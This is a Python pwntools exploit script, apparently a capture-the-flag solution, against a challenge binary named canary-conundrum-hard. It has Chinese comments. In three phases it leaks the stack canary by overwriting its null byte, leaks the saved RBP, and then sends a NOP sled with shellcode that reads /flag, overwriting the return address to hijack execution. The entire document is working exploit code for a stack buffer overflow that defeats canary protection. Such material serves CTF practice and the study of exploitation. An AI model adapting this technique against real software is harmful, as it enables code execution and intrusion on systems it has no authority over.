#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

# buf -> canary
OFFSET = 112

def exploit():
    p = process("/challenge/canary-conundrum-hard")

    # ==========================================
    # Phase 1: 泄露 Canary
    # ==========================================
    p.sendlineafter(b"Payload size: ", str(OFFSET + 1).encode())

    # 填充 112 字节到达 Canary，用 b"X" 覆盖最低位的 \x00
    payload1 = b"REPEAT".ljust(OFFSET, b"A") + b"X"
    p.sendafter(b"!\n", payload1)

    p.recvuntil(b"You said: ")
    p.recv(OFFSET + 1)
    # 获取真正的 7 字节 Canary 并拼回 \x00
    canary = u64(b"\x00" + p.recv(7))
    log.success(f"[*] Canary: {hex(canary)}")

    # ==========================================
    # Phase 2: 越过 Canary 泄露 Saved RBP
    # ==========================================
    # 大小：112 (Buffer) + 8 (Canary) = 120 字节
    p.sendlineafter(b"Payload size: ", str(OFFSET + 8).encode())

    # 我们再次用 b"Y" 覆盖 Canary 的 \x00，让 puts 一路读到 RBP
    payload2 = b"REPEAT".ljust(OFFSET, b"A") + b"Y" + p64(canary)[1:8]
    p.sendafter(b"!\n", payload2)

    p.recvuntil(b"You said: ")
    p.recv(OFFSET + 8)
    # Linux 用户态栈地址通常是 6 字节，剩下的补 \x00 解包
    leaked_rbp = u64(p.recv(6).ljust(8, b"\x00"))
    log.success(f"[*] Saved RBP: {hex(leaked_rbp)}")

    # ==========================================
    # Phase 3: 部署 Shellcode 并劫持控制流
    # ==========================================
    p.sendlineafter(b"Payload size: ", str(OFFSET + 8 + 8 + 8).encode())

    # 因为存在三次递归，缓冲区的实际地址在更早的栈帧里
    # 我们可以通过稍微宽裕的 NOP sled 配合粗略计算的偏移（大约 0x140 到 0x160 之间）来接住执行流
    target_addr = leaked_rbp - 0x150

    shellcode = asm(shellcraft.cat("/flag"))

    # 构建 Payload：NOP Sled + Shellcode + 填充对齐 + 完美 Canary + 假 RBP + 返回地址
    payload3 = b"\x90" * (OFFSET - len(shellcode)) + shellcode
    payload3 += p64(canary)       # 注入未被破坏的 Canary 绕过检测
    payload3 += b"B" * 8          # Dummy RBP
    payload3 += p64(target_addr)  # 劫持 RIP 到我们的 NOP sled

    p.sendafter(b"!\n", payload3)
    p.interactive()

if __name__ == "__main__":
    exploit()

